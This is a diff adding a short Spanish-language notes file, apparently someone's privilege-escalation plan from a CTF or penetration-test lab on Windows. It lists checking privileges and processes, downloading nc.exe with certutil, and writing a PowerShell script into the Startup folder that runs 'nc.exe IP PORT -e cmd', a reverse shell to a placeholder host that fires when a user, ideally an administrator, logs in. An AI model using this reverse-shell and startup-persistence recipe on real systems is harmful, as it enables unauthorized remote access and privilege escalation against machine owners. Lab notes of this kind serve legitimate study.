@@ -1,0 +1,14 @@
+Root.txt
+
+Mirar cosas: privs usuario, procesos, ...
+
+Mirar ...startUp\
+
+uyba si puedo crear ficheros.
+
+instalar nc.exe con certutil.
+
+crear archivo k ejecute el nc.exe: path\nc.exe IP PORT -e cmd:
+write-output "nc.exe: path\nc.exe IP PORT -e cmd" > file.ps1
+
+y cuando se conecte un usuario me conectare como ese usuario. Cruzo los dedos para k sea admin el k se conecte :)
